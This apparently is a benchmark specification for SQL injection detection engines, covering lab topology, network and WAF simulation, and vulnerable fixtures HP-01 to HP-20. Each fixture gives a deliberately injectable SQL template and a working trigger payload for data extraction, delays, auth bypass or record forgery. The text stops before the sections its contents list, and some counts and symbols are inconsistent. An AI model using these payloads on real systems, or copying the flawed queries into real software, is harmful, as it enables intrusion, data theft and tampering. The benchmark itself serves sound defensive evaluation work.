# MASTER BENCHMARK LABORATORY, GROUND-TRUTH CORPORA, QUANTITATIVE METRICS & SYSTEMIC FAILURE TAXONOMY
## Scientific Evaluation Framework for Next-Generation Evidence-Driven SQL Injection Detection Engines

**Document ID:** `BENCHMARK_LAB_AND_FAILURE_TAXONOMY.md`  
**Classification:** Authoritative Technical Benchmark Specification, Empirical Testbeds & Failure Taxonomy  
**Author:** Next-Generation Evidence-Driven SQLi Engine Research Group (Adversarial Red-Team & Failure Mode Specialist)  
**Authoritative Request Mapping:** Master Research Specification (Section 63: Items 15, 16, 17, 18, 19)  
**Date:** August 30, 2026  
**Status:** COMPLETE / FROZEN FOR BENCHMARK HARNESS INTEGRATION  

---

## TABLE OF CONTENTS
1. [Section 15: Master Benchmark Laboratory Design](#15-master-benchmark-laboratory-design)
   - 15.1 [Architectural Topology & Containerized Multi-DBMS Testbed](#151-architectural-topology--containerized-multi-dbms-testbed)
   - 15.2 [Diverse Application Layer Architectures & Data Access Paradigms](#152-diverse-application-layer-architectures--data-access-paradigms)
   - 15.3 [Realistic Network Simulation Harness & Deterministic Chaos Injection](#153-realistic-network-simulation-harness--deterministic-chaos-injection)
   - 15.4 [Intermediate WAF & Reverse Proxy Simulation Layer](#154-intermediate-waf--reverse-proxy-simulation-layer)
2. [Section 16: Hard-Positive Corpus (Ground-Truth Vulnerable Fixtures)](#16-hard-positive-corpus-ground-truth-vulnerable-fixtures)
   - 16.1 [Category 1: Deeply Nested Subqueries & Common Table Expressions (CTEs)](#161-category-1-deeply-nested-subqueries--common-table-expressions-ctes)
   - 16.2 [Category 2: ORDER BY / GROUP BY / HAVING Injection Without Error Reflection](#162-category-2-order-by--group-by--having-injection-without-error-reflection)
   - 16.3 [Category 3: Second-Order / Stored Injection Through Async Worker Queues & Message Buses](#163-category-3-second-order--stored-injection-through-async-worker-queues--message-buses)
   - 16.4 [Category 4: JSON / JSONB Extraction Operator Injections](#164-category-4-json--jsonb-extraction-operator-injections)
   - 16.5 [Category 5: ORM-Specific Leaks & Query Interpolation Flaws](#165-category-5-orm-specific-leaks--query-interpolation-flaws)
   - 16.6 [Category 6: Polyglot & Multi-Encoding Injections](#166-category-6-polyglot--multi-encoding-injections)
   - 16.7 [Category 7: Time-Based Blind Under Extreme Network Jitter & Non-Stationary Drift](#167-category-7-time-based-blind-under-extreme-network-jitter--non-stationary-drift)
   - 16.8 [Category 8: Blind Boolean With Minimal 1-Bit Delta](#168-category-8-blind-boolean-with-minimal-1-bit-delta)
   - 16.9 [Category 9: Stored Procedure & Dynamic SQL Execution](#169-category-9-stored-procedure--dynamic-sql-execution)
   - 16.10 [Category 10: Non-Standard DBMS Features & Vendor Dialects](#1610-category-10-non-standard-dbms-features--vendor-dialects)
3. [Section 17: Hard-Negative Corpus (Difficult Negative Controls)](#17-hard-negative-corpus-difficult-negative-controls)
   - 17.1 [Category 1: Reflected Input in SQL Error Lookalike Strings](#171-category-1-reflected-input-in-sql-error-lookalike-strings)
   - 17.2 [Category 2: Mathematical & Arithmetic Parameters in Safe Domain Logic](#172-category-2-mathematical--arithmetic-parameters-in-safe-domain-logic)
   - 17.3 [Category 3: Search Engines Echoing Arbitrary SQL Keywords](#173-category-3-search-engines-echoing-arbitrary-sql-keywords)
   - 17.4 [Category 4: Randomly Fluctuating Page Contents & Dynamic Noise](#174-category-4-randomly-fluctuating-page-contents--dynamic-noise)
   - 17.5 [Category 5: Stateful Rate Limiters / WAF Tarpits Mimicking Blind Delays](#175-category-5-stateful-rate-limiters--waf-tarpits-mimicking-blind-delays)
   - 17.6 [Category 6: Integer Type-Casting Returning 0 on Non-Numeric Strings](#176-category-6-integer-type-casting-returning-0-on-non-numeric-strings)
   - 17.7 [Category 7: WAF Blocking Pages Returning HTTP 500 / "Database Error"](#177-category-7-waf-blocking-pages-returning-http-500--database-error)
   - 17.8 [Category 8: Safe Parameterized Queries with Non-SQL Formatting](#178-category-8-safe-parameterized-queries-with-non-sql-formatting)
   - 17.9 [Category 9: Safe ORM / Query Builder Parameters with Reserved Keyword Names](#179-category-9-safe-orm--query-builder-parameters-with-reserved-keyword-names)
   - 17.10 [Category 10: Multi-Tenant Boundary Checks & Generic Auth Rejections](#1710-category-10-multi-tenant-boundary-checks--generic-auth-rejections)
4. [Section 18: Quantitative Statistical & Verification Metrics](#18-quantitative-statistical--verification-metrics)
   - 18.1 [Precision, Target False Positive Rate ($FPR \le 10^{-4}$) & Error Bounds](#181-precision-target-false-positive-rate-fpr-le-10-4--error-bounds)
   - 18.2 [Recall, Detection Rate & Context Coverage Index ($CCI$)](#182-recall-detection-rate--context-coverage-index-cci)
   - 18.3 [Request Cost ($R_{\text{avg}}$) & Average Sample Number ($ASN$) for SPRT](#183-request-cost-r_textavg--average-sample-number-asn-for-sprt)
   - 18.4 [Information-Theoretic Extraction Efficiency ($\eta$)](#184-information-theoretic-extraction-efficiency-eta)
   - 18.5 [Jitter Resilience Index ($JRI$)](#185-jitter-resilience-index-jri)
   - 18.6 [Verification Reproducibility Rate ($VRR$)](#186-verification-reproducibility-rate-vrr)
5. [Section 19: Comprehensive Failure Taxonomy (FT-01 through FT-16)](#19-comprehensive-failure-taxonomy-ft-01-through-ft-16)
   - 19.1 [Domain 1: False Positive Failure Modes (FT-01 to FT-05)](#191-domain-1-false-positive-failure-modes-ft-01-to-ft-05)
   - 19.2 [Domain 2: False Negative Failure Modes (FT-06 to FT-10)](#192-domain-2-false-negative-failure-modes-ft-06-to-ft-10)
   - 19.3 [Domain 3: Reliability & Resource Failure Modes (FT-11 to FT-13)](#193-domain-3-reliability--resource-failure-modes-ft-11-to-ft-13)
   - 19.4 [Domain 4: Statefulness & Integrity Failure Modes (FT-14 to FT-16)](#194-domain-4-statefulness--integrity-failure-modes-ft-14-to-ft-16)

---

## 15. Master Benchmark Laboratory Design

### 15.1 Architectural Topology & Containerized Multi-DBMS Testbed

To rigorously evaluate detection engines under authentic production conditions without reliance on synthetic toy scripts, the Master Benchmark Laboratory implements an isolated, containerized micro-datacenter. The architecture spans six production relational database management systems (DBMS), interconnected through isolated Docker/Podman bridge networks with deterministic routing, latency injection, and state reset hooks.

```
+-----------------------------------------------------------------------------------------------------------------------+
|                                        MASTER BENCHMARK LABORATORY TOPOLOGY                                           |
+-----------------------------------------------------------------------------------------------------------------------+
                                        [Scanner Under Test (Next-Gen Engine)]
                                                          |
                                                          v
+-----------------------------------------------------------------------------------------------------------------------+
| LAYER 1: NETWORK EMULATION & REVERSE PROXY WAF TIER                                                                  |
| - Toxiproxy / Linux NetEm (Gaussian Jitter: 0-500ms, Pareto Heavy Tail: ?=1.5, Packet Loss: 0-10%, TCP Resets)       |
| - Intermediate WAFs: ModSecurity v3 (OWASP CRS v4 PL1-PL4), AWS WAF Simulator, Cloudflare Tokenizer Emulation         |
+-----------------------------------------------------------------------------------------------------------------------+
                                                          |
                                                          v
+-----------------------------------------------------------------------------------------------------------------------+
| LAYER 2: APPLICATION SERVICE MATRIX (Diverse Frameworks & Transport Protocols)                                       |
| +-----------------------------------+-----------------------------------+-----------------------------------+ |
| | REST / JSON APIs                  | GraphQL & Apollo Federation       | Async Microservices & WebSockets  | |
| | (Node.js/Express, Python/FastAPI, | (Apollo Server v4, Python/Ariadne,| (RabbitMQ/Celery workers,         | |
| |  Go/Gin, Rust/Axum, Java/Spring)  |  Rust/async-graphql)              |  Socket.io, gRPC Reflection v1)   | |
| +-----------------------------------+-----------------------------------+-----------------------------------+ |
| | Object-Relational Mappers (ORMs)  | Query Builders & Functional SQL   | Direct Driver & Raw SQL Engines   | |
| | (Hibernate 6, Django 5, Prisma 5, | (Knex.js, Diesel 2.2, PyPika,     | (psycopg3, mysqlclient, sqlite3,  | |
| |  SQLAlchemy 2.0, Sequelize 6)     |  Kysely, TypeORM)                 |  node-postgres, mssql-node)       | |
| +-----------------------------------+-----------------------------------+-----------------------------------+ |
+-----------------------------------------------------------------------------------------------------------------------+
                                                          |
                                                          v
+-----------------------------------------------------------------------------------------------------------------------+
| LAYER 3: ISOLATED MULTI-DBMS TARGET CLUSTER (State-Snapshotted with Instant Rollback via CoW / WAL)                  |
| +---------------------+---------------------+---------------------+---------------------+---------------------+ |
| | PostgreSQL 16.3     | MySQL 8.4 LTS       | MariaDB 11.4 LTS    | SQLite 3.45.3       | Microsoft SQL 2022  | Oracle 23c Free     |
| | (JSONB, CTE, RegEx) | (Optimizer, Regex)  | (Pluggable Engines) | (Dynamic Typing)    | (T-SQL, XML, SPs)   | (PL/SQL, XMLTable)  |
| +---------------------+---------------------+---------------------+---------------------+---------------------+ |
+-----------------------------------------------------------------------------------------------------------------------+
```

#### 15.1.1 Target DBMS Configuration & Feature Coverage Matrix
```
+-----+----------------------+-------------------+-------------------------------+--------------------------------------+
| #   | DBMS Engine          | Tested Version    | Specific Dialect Features     | Storage Engine / Isolation Level     |
+-----+----------------------+-------------------+-------------------------------+--------------------------------------+
| 1   | PostgreSQL           | 16.3 (Debian)     | JSONB (#>>, ->), CTEs, COPY   | Heap Engine, Read Committed / MVCC   |
| 2   | MySQL                | 8.4 LTS (Oracle)  | JSON_EXTRACT, Regex, Optimizer| InnoDB, Repeatable Read / MVCC       |
| 3   | MariaDB              | 11.4 LTS          | System-versioned tables, CONNECT| Aria / InnoDB, Repeatable Read     |
| 4   | SQLite               | 3.45.3 (C Engine) | Typeless columns, ATTACH, FTS5| File-backed WAL Mode, Serialized     |
| 5   | Microsoft SQL Server | 2022 (CU12 Linux) | T-SQL, sp_executesql, XML     | RowStore / ColumnStore, Read Comm.   |
| 6   | Oracle Database      | 23c Free (Docker) | PL/SQL, XMLTABLE, Hierarchical| ASM / CDB-PDB, Read Committed MVCC   |
+-----+----------------------+-------------------+-------------------------------+--------------------------------------+
```

---

### 15.2 Diverse Application Layer Architectures & Data Access Paradigms

The benchmark lab rejects the simplistic assumption that web applications consist solely of flat PHP scripts concatenating raw GET parameters into string queries. The testbed deploys 8 distinct data access architectures:
1. **Raw SQL / Native Drivers:** Explicit SQL query strings constructed with direct language drivers (`psycopg3`, `mysqlclient`, `sqlite3`, `node-postgres`).
2. **Object-Relational Mappers (ORMs):** High-level entity abstraction layers:
   - **Django ORM 5.0:** Seeded with insecure `.extra(select={...})`, `.raw()`, and raw field ordering lookups.
   - **Hibernate 6 / Spring Boot 3.3:** Seeded with HQL/JPQL parameter interpolation and unescaped criteria expressions.
   - **SQLAlchemy 2.0 (Python):** Seeded with `text()` un-bound interpolation and dynamic column projection flaws.
   - **Prisma 5.15 (Node.js/TypeScript):** Seeded with `$queryRawUnsafe` and malformed nested filter conditions.
   - **Sequelize 6.37 (Node.js):** Seeded with `Sequelize.literal()` within `attributes` and `order` arrays.
3. **Query Builders:** Intermediate SQL construction engines (`Knex.js`, `Diesel 2.2`, `PyPika`, `Kysely`) with dynamic clause composition flaws.
4. **GraphQL APIs:** Apollo Server v4 and async-graphql endpoints accepting complex JSON AST queries with vulnerable GraphQL field resolvers.
5. **Asynchronous Worker Queues:** RabbitMQ / Celery worker architectures where input is ingested via HTTP API, stored in a Redis queue, and executed asynchronously by backend background workers (**Second-Order & Stored SQLi**).
6. **Streaming & WebSocket Endpoints:** Full-duplex WebSocket connections streaming real-time stock/telemetry data evaluated against dynamic backend database filters.

---

### 15.3 Realistic Network Simulation Harness & Deterministic Chaos Injection

To rigorously stress-test timing oracles (Wald's SPRT, Welch's t-test) and differential graph invariants under non-ideal network environments, the lab integrates **Toxiproxy** and **Linux NetEm (Network Emulation)**:

```
+----------------------------------------------------------------------------------------------------+
|                             NETWORK CHAOS INJECTION SIMULATION PROFILES                            |
+----------------------------------------------------------------------------------------------------+

1. Profile "Stationary Baseline":
   - Latency: ? = 15ms, ? = 1.2ms (Gaussian)
   - Packet Loss: 0.0%
   - Jitter: None

2. Profile "Enterprise WAN & Jitter":
   - Latency: ? = 120ms, ? = 45ms (Gaussian)
   - Latency Spikes: Random micro-delays between 200ms and 600ms (p = 0.04)
   - Packet Loss: 0.5% random drop

3. Profile "Adversarial Heavy-Tail Pareto":
   - Latency Distribution: Pareto Type II (Lomax) with scale xm = 40ms, shape ? = 1.45
   - Mean Latency: E[X] = 128.8ms, Variance: Var[X] = ? (Heavy-Tailed Asymmetric Jitter)
   - Connection Resets: TCP RST injected every 250 requests

4. Profile "Cellular / High-Loss Edge":
   - Latency: ? = 250ms, ? = 110ms
   - Packet Loss: 5.0% random burst loss (Gilbert-Elliott Markov model)
   - HTTP/2 GOAWAY Frame Injection: p = 0.02
```

---

### 15.4 Intermediate WAF & Reverse Proxy Simulation Layer

All test fixtures can be routed through an intermediate reverse-proxy tier configured with three distinct Web Application Firewall profiles:
1. **ModSecurity v3 with OWASP Core Rule Set (CRS) v4.0:**
   - **Paranoia Level 1 (PL1):** Standard commercial baseline rule enforcement.
   - **Paranoia Level 2 (PL2):** Advanced token validation, comment detection, and whitespace checks.
   - **Paranoia Level 3 & 4 (PL3/PL4):** Strict anomaly scoring, keyword blocking (`UNION`, `SELECT`, `OR`), and payload length limits.
2. **AWS WAF Simulated Rule Group:** AWS Managed Rules for SQL Injection (`AWSManagedRulesSQLiRuleSet`) enforcing deterministic token filtering and body inspection boundaries.
3. **Cloudflare-Emulated Edge Tokenizer:** Simulating rate-based IP tarpitting ($429	ext{ Too Many Requests}$), progressive delay injection ($+200	ext{ms}$ per suspicious request), and randomized HTML disclaimer injection.

---

## 16. Hard-Positive Corpus (Ground-Truth Vulnerable Fixtures)

The Hard-Positive Corpus consists of **50+ ground-truth vulnerable fixtures** across 10 specialized difficulty categories, specifically designed to expose the limitations of legacy scanners (e.g. sqlmap dictionary failure, libinjection C-state desync, and regex bypasses).

```
+---------------------------------------------------------------------------------------------------------------+
|                                HARD-POSITIVE CORPUS CATEGORY DISTRIBUTION                                     |
+--------------------------------------------------------------------+------------------------------------------+
| Category                                                           | Fixture ID Range & Scope                 |
+--------------------------------------------------------------------+------------------------------------------+
| Cat 1: Deeply Nested Subqueries & Common Table Expressions (CTEs)  | HP-01 to HP-05 (Subqueries, CTEs, EXISTS)|
| Cat 2: ORDER BY / GROUP BY / HAVING Without Error Reflection       | HP-06 to HP-10 (Blind ordering & ordinals|
| Cat 3: Second-Order / Stored Injection Through Async Worker Queues | HP-11 to HP-15 (Celery, Redis, Webhooks) |
| Cat 4: JSON / JSONB Extraction Operator Injections                 | HP-16 to HP-20 (Postgres, MySQL, SQLite) |
| Cat 5: ORM-Specific Leaks & Query Interpolation Flaws              | HP-21 to HP-25 (Django, Hibernate, HQL)  |
| Cat 6: Polyglot & Multi-Encoding Injections                        | HP-26 to HP-30 (Unicode, Base64, XML)    |
| Cat 7: Time-Based Blind Under Extreme Jitter & Drift               | HP-31 to HP-35 (SPRT, Pareto noise)      |
| Cat 8: Blind Boolean With Minimal 1-Bit Delta                      | HP-36 to HP-40 (Whitespace, CSS classes) |
| Cat 9: Stored Procedure & Dynamic SQL Execution                    | HP-41 to HP-45 (sp_executesql, PL/SQL)   |
| Cat 10: Non-Standard DBMS Features & Vendor Dialects               | HP-46 to HP-50+ (COPY, ATTACH, HANDLER)  |
+--------------------------------------------------------------------+------------------------------------------+
```

---

### 16.1 Category 1: Deeply Nested Subqueries & Common Table Expressions (CTEs)

#### Fixture HP-01: Recursive CTE Anchor Member Injection
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** Node.js / Express with `pg` driver (Raw SQL)
- **Injection Context:** Numeric literal inside CTE anchor member `WHERE` clause
- **Vulnerable SQL Template:**
  ```sql
  WITH RECURSIVE org_tree AS (
      SELECT id, parent_id, name, 1 as depth FROM organizations WHERE id = [INJECTION]
      UNION ALL
      SELECT o.id, o.parent_id, o.name, ot.depth + 1 FROM organizations o JOIN org_tree ot ON o.parent_id = ot.id
  ) SELECT * FROM org_tree WHERE depth <= 5;
  ```
- **Ground-Truth Trigger Vector:** `1 UNION SELECT 999, NULL, 'Injected', 1--`
- **Forensic Evidence Artifact:** Injected string `'Injected'` appears in the returned JSON organization tree response.
- **Why Legacy Scanners Fail:** Standard scanners attempt top-level `UNION SELECT` or boolean `OR 1=1`, which fail with `UNION query has different number of columns` or syntax errors inside the recursive CTE definition.

#### Fixture HP-02: Correlated Subquery Projection in SELECT Column List
- **Target DBMS:** MySQL 8.4 LTS
- **Application Architecture:** Python / FastAPI with `asyncmy`
- **Injection Context:** String literal inside correlated subquery projection
- **Vulnerable SQL Template:**
  ```sql
  SELECT p.id, p.title, (SELECT u.username FROM users u WHERE u.id = p.author_id AND u.status = '[INJECTION]') AS author_name FROM posts p WHERE p.is_published = 1;
  ```
- **Ground-Truth Trigger Vector:** `active') AND (SELECT 1 FROM (SELECT SLEEP(0.35))a)-- -`
- **Forensic Evidence Artifact:** Execution time increases by exactly $N_{\text{posts}} \times 350\text{ms}$ due to correlated row-by-row subquery evaluation.
- **Why Legacy Scanners Fail:** Single-quote breakout without balancing closing parentheses `)` triggers fatal syntax errors; scanners fail to infer the nested scalar subquery wrapper.

#### Fixture HP-03: Triple-Nested EXISTS Subquery Predicate
- **Target DBMS:** Microsoft SQL Server 2022
- **Application Architecture:** ASP.NET Core 8 / C# with Dapper
- **Injection Context:** String literal inside inner-most `EXISTS` clause
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM customers c WHERE EXISTS (
      SELECT 1 FROM orders o WHERE o.customer_id = c.id AND EXISTS (
          SELECT 1 FROM order_items i WHERE i.order_id = o.id AND i.sku = '[INJECTION]'
      )
  );
  ```
- **Ground-Truth Trigger Vector:** `SKU-99' OR '1'='1'--`
- **Forensic Evidence Artifact:** Response set expands from 0 customers to all registered customers in the database.
- **Why Legacy Scanners Fail:** Error messages are suppressed by the application; requires balancing two levels of enclosing parentheses if injecting complex expressions.

#### Fixture HP-04: CTE Window Function PARTITION BY Injection
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** Go / Gin with `pgx`
- **Injection Context:** Column identifier inside window function within CTE
- **Vulnerable SQL Template:**
  ```sql
  WITH ranked_sales AS (
      SELECT region, salesperson, amount, RANK() OVER (PARTITION BY [INJECTION] ORDER BY amount DESC) as rnk FROM sales
  ) SELECT * FROM ranked_sales WHERE rnk = 1;
  ```
- **Ground-Truth Trigger Vector:** `region, (CASE WHEN (1=1) THEN 1 ELSE (1/0) END)`
- **Forensic Evidence Artifact:** Differential division-by-zero database error trigger under conditional boolean modulation.
- **Why Legacy Scanners Fail:** Scanners attempt boolean injections or `UNION` in an identifier context where only expression lists or column names are valid before the `ORDER BY` sub-clause.

#### Fixture HP-05: Scalar Subquery in UPDATE CASE-WHEN Assignment
- **Target DBMS:** Oracle 23c Free
- **Application Architecture:** Java 21 / Spring Boot with MyBatis
- **Injection Context:** Dynamic numeric scalar inside `CASE WHEN` condition in `UPDATE`
- **Vulnerable SQL Template:**
  ```sql
  UPDATE inventory SET stock_count = CASE WHEN item_type = 'A' THEN stock_count - 1 WHEN item_type = 'B' THEN (SELECT base_qty * [INJECTION] FROM config WHERE id = 1) ELSE stock_count END WHERE warehouse_id = 10;
  ```
- **Ground-Truth Trigger Vector:** `1 * (SELECT CASE WHEN (USER LIKE 'SYS%') THEN 1 ELSE 0 END FROM DUAL)`
- **Forensic Evidence Artifact:** Observable inventory delta matches conditional subquery evaluation.
- **Why Legacy Scanners Fail:** Injection is inside a DML write statement without direct error reflection; naive probes risk corrupting non-target stock counts.

---

### 16.2 Category 2: ORDER BY / GROUP BY / HAVING Injection Without Error Reflection

#### Fixture HP-06: Blind ORDER BY Column Position Modulation
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** Python / Django 5.0 (Custom raw SQL query builder)
- **Injection Context:** Column index / expression after `ORDER BY`
- **Vulnerable SQL Template:**
  ```sql
  SELECT id, username, email, created_at FROM users WHERE is_active = true ORDER BY [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `(CASE WHEN (SELECT 1=1) THEN 1 ELSE 2 END) ASC`
- **Forensic Evidence Artifact:** Output rows re-order from ID-ascendant (1, 2, 3) to Username-ascendant (Aaron, Bob, Charlie).
- **Why Legacy Scanners Fail:** Standard boolean tautologies (`' OR 1=1--`) cause syntax errors in `ORDER BY`; legacy scanners report endpoint as non-vulnerable because no SQL errors are returned.

#### Fixture HP-07: GROUP BY Column Identifier Injection
- **Target DBMS:** MySQL 8.4 LTS
- **Application Architecture:** Node.js / Fastify with `mysql2`
- **Injection Context:** Column alias in `GROUP BY` clause
- **Vulnerable SQL Template:**
  ```sql
  SELECT department, status, COUNT(*) as cnt FROM employees WHERE is_active = 1 GROUP BY [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `department, (CASE WHEN (VERSION() LIKE '8.4%') THEN status ELSE 1 END)`
- **Forensic Evidence Artifact:** Number of returned grouped buckets changes dynamically based on the boolean assertion.
- **Why Legacy Scanners Fail:** Scanners fail to maintain valid aggregate grouping semantics, producing `Expression #1 of SELECT list is not in GROUP BY clause` failures.

#### Fixture HP-08: Blind HAVING Clause Boolean Predicate
- **Target DBMS:** SQLite 3.45.3
- **Application Architecture:** Rust / Axum with `rusqlite`
- **Injection Context:** Aggregate predicate after `HAVING`
- **Vulnerable SQL Template:**
  ```sql
  SELECT category_id, AVG(price) as avg_p FROM products GROUP BY category_id HAVING AVG(price) > 50 AND [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `1=1` vs `1=2` (or `(SELECT COUNT(*) FROM sqlite_master) > 0`)
- **Forensic Evidence Artifact:** Complete result set returned under `1=1`; empty result set (`[]`) returned under `1=2`.
- **Why Legacy Scanners Fail:** Scanners treat the parameter as a standard `WHERE` filter and attempt quote breakout, breaking the aggregate `HAVING` expression.

#### Fixture HP-09: ORDER BY with Collation Modulation
- **Target DBMS:** Microsoft SQL Server 2022
- **Application Architecture:** Go / Fiber with `go-mssqldb`
- **Injection Context:** Dynamic collation clause in `ORDER BY`
- **Vulnerable SQL Template:**
  ```sql
  SELECT id, product_name FROM items ORDER BY product_name COLLATE [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `Latin1_General_CI_AS` vs `Latin1_General_BIN`
- **Forensic Evidence Artifact:** Case-insensitive sorting vs byte-exact binary sorting shifts rows containing uppercase titles to the top.
- **Why Legacy Scanners Fail:** Scanners do not synthesize SQL Server collation token identifiers; dictionary payloads trigger fatal syntax errors.

#### Fixture HP-10: Blind Window Function OVER (ORDER BY) Injection
- **Target DBMS:** MariaDB 11.4 LTS
- **Application Architecture:** PHP 8.3 / Laravel (Raw DB query)
- **Injection Context:** Window sorting clause in analytic query
- **Vulnerable SQL Template:**
  ```sql
  SELECT id, score, DENSE_RANK() OVER (ORDER BY [INJECTION]) as rank FROM leaderboard;
  ```
- **Ground-Truth Trigger Vector:** `(CASE WHEN (SELECT 1=1) THEN score ELSE id END) DESC`
- **Forensic Evidence Artifact:** Rank assignment values invert for duplicate score entries.
- **Why Legacy Scanners Fail:** Window function parsing in MariaDB requires strict expression scoping; scanners emit quotes that break the `OVER (...)` token block.

---

### 16.3 Category 3: Second-Order / Stored Injection Through Async Worker Queues & Message Buses

#### Fixture HP-11: Asynchronous Celery Worker Analytics Ingestion
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** Python / FastAPI (Ingest API) + Celery / RabbitMQ Worker (Sink Query)
- **Injection Context:** User-Agent / Event Metadata string stored in PostgreSQL JSONB, subsequently extracted and concatenated in a batch rollup worker:
- **Vulnerable SQL Template (Async Sink):**
  ```sql
  -- Executed in Celery Task 30 seconds after HTTP POST:
  INSERT INTO daily_metrics (metric_name, total) 
  SELECT 'event_' || event_type, COUNT(*) FROM raw_events WHERE event_data->>'campaign' = '[STORED_INJECTION]' GROUP BY event_type;
  ```
- **Ground-Truth Trigger Vector:** `Summer2026' OR (SELECT pg_sleep(3.5)) IS NOT NULL--`
- **Forensic Evidence Artifact:** Asynchronous OAST DNS callback or delayed worker task execution heartbeat.
- **Why Legacy Scanners Fail:** Zero response delta in the synchronous HTTP POST response; legacy scanners evaluate the endpoint as 100% safe.

#### Fixture HP-12: Stored User Profile Display in Administrative Audit Log
- **Target DBMS:** MySQL 8.4 LTS
- **Application Architecture:** Ruby on Rails 7.1 + Sidekiq Worker
- **Injection Context:** Display name updated in `POST /profile`, later queried in `GET /admin/audit-search?filter=...`:
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM audit_logs WHERE actor_name = '[STORED_INJECTION]' ORDER BY timestamp DESC;
  ```
- **Ground-Truth Trigger Vector:** `Admin' UNION SELECT 1,2,@@version,4,5-- -`
- **Forensic Evidence Artifact:** Database version banner appears in the administrative audit search table upon next admin poll.
- **Why Legacy Scanners Fail:** Decoupled persistence and execution sinks; requires multi-step stateful session tracking.

#### Fixture HP-13: Webhook Event Storage & Deferred Query Processing
- **Target DBMS:** SQLite 3.45.3
- **Application Architecture:** Rust / Tokio + SQLite background thread
- **Injection Context:** Webhook JSON payload payload stored in SQLite table, later queried during nightly invoice reconciliation:
- **Vulnerable SQL Template:**
  ```sql
  SELECT invoice_id, SUM(amount) FROM payments WHERE customer_ref = '[STORED_INJECTION]' GROUP BY invoice_id;
  ```
- **Ground-Truth Trigger Vector:** `CUST-10' UNION SELECT 1, 99999.00--`
- **Forensic Evidence Artifact:** Reconciled balance displays an unauthorized credit injection.
- **Why Legacy Scanners Fail:** Requires tracking the lifecycle across decoupled webhook ingestion and batch settlement endpoints.

#### Fixture HP-14: Session Store Deserialization into Dynamic SQL
- **Target DBMS:** Microsoft SQL Server 2022
- **Application Architecture:** ASP.NET Framework with SQL Server Session State Provider
- **Injection Context:** Session preference object deserialized and dynamically queried for user recommendations:
- **Vulnerable SQL Template:**
  ```sql
  EXEC('SELECT TOP 5 * FROM products WHERE category = ''' + @SessionPrefCategory + '''');
  ```
- **Ground-Truth Trigger Vector:** `Electronics' WAITFOR DELAY '0:0:3'--`
- **Forensic Evidence Artifact:** Subsequent authenticated requests experience a 3-second delay.
- **Why Legacy Scanners Fail:** Initial injection returns HTTP 200 immediately; requires multi-request cookie jar persistence and timing correlation.

#### Fixture HP-15: Async Push Notification Queue Ingestion
- **Target DBMS:** MariaDB 11.4 LTS
- **Application Architecture:** Go microservice writing to Kafka; consumer microservice writing to MariaDB
- **Injection Context:** Notification message payload interpolated in consumer SQL sink:
- **Vulnerable SQL Template:**
  ```sql
  INSERT INTO notification_history (user_id, body) VALUES (102, '[STORED_INJECTION]');
  ```
- **Ground-Truth Trigger Vector:** `Welcome!'), (103, (SELECT @@version))-- -`
- **Forensic Evidence Artifact:** Secondary notification history record contains the DBMS version string.
- **Why Legacy Scanners Fail:** Cross-service message bus boundary disconnects HTTP request from SQL sink.

---

### 16.4 Category 4: JSON / JSONB Extraction Operator Injections

#### Fixture HP-16: PostgreSQL JSONB Path Query Operator Injection
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** Python / FastAPI with `asyncpg`
- **Injection Context:** Unescaped string inside JSONB path expression
- **Vulnerable SQL Template:**
  ```sql
  SELECT id, data FROM documents WHERE data @? ('$.metadata.tags[*] ? (@ == "' || [INJECTION] || '")')::jsonpath;
  ```
- **Ground-Truth Trigger Vector:** `security") || true || ("`
- **Forensic Evidence Artifact:** Query matches all document records via jsonpath boolean short-circuit.
- **Why Legacy Scanners Fail:** Standard SQL injection payloads cause `ERROR: invalid input syntax for type jsonpath`; scanners fail to synthesize valid jsonpath filter expressions.

#### Fixture HP-17: MySQL JSON_EXTRACT Dynamic Path Injection
- **Target DBMS:** MySQL 8.4 LTS
- **Application Architecture:** Node.js / Express with `mysql2`
- **Injection Context:** JSON path argument in `JSON_EXTRACT`
- **Vulnerable SQL Template:**
  ```sql
  SELECT id, doc FROM catalog WHERE JSON_EXTRACT(doc, CONCAT('$.attributes.', [INJECTION])) = 'active';
  ```
- **Ground-Truth Trigger Vector:** `status') = 'active' OR 1=1-- -`
- **Forensic Evidence Artifact:** Full catalog table returned in JSON response.
- **Why Legacy Scanners Fail:** Scanners fail to escape the single-quote within the `CONCAT` function argument before breaking out into SQL relational logic.

#### Fixture HP-18: PostgreSQL #>> Operator Dynamic Key Array
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** Ruby on Rails 7.1 with `pg` gem
- **Injection Context:** Text array path in `#>>` operator
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM config_store WHERE payload #>> ARRAY['user', '[INJECTION]'] = 'true';
  ```
- **Ground-Truth Trigger Vector:** `admin'] = 'true' OR (SELECT 1)=1--`
- **Forensic Evidence Artifact:** Bypasses admin configuration authorization check.
- **Why Legacy Scanners Fail:** Requires closing `ARRAY[...]` literal syntax with bracket `]` and quote `'` before injecting SQL operators.

#### Fixture HP-19: SQLite json_extract with Subquery Path
- **Target DBMS:** SQLite 3.45.3
- **Application Architecture:** Python / Flask with `sqlite3`
- **Injection Context:** Column identifier and path in `json_extract()`
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM entries WHERE json_extract(attributes, '$.' || [INJECTION]) IS NOT NULL;
  ```
- **Ground-Truth Trigger Vector:** `key) IS NOT NULL OR (SELECT 1=1)--`
- **Forensic Evidence Artifact:** Tautology returns all entries.
- **Why Legacy Scanners Fail:** Scanners treat `json_extract` as a standard string parameter and emit unclosed quote payloads.

#### Fixture HP-20: MSSQL JSON_VALUE in Computed Projection
- **Target DBMS:** Microsoft SQL Server 2022
- **Application Architecture:** C# / .NET 8 Web API
- **Injection Context:** Path string in `JSON_VALUE`
- **Vulnerable SQL Template:**
  ```sql
  SELECT id, JSON_VALUE(raw_json, '$.settings.' + [INJECTION]) as setting_val FROM user_settings;
  ```
- **Ground-Truth Trigger Vector:** `theme') + CAST((SELECT @@version) AS VARCHAR(100))--`
- **Forensic Evidence Artifact:** System version string reflected inside setting value JSON response.
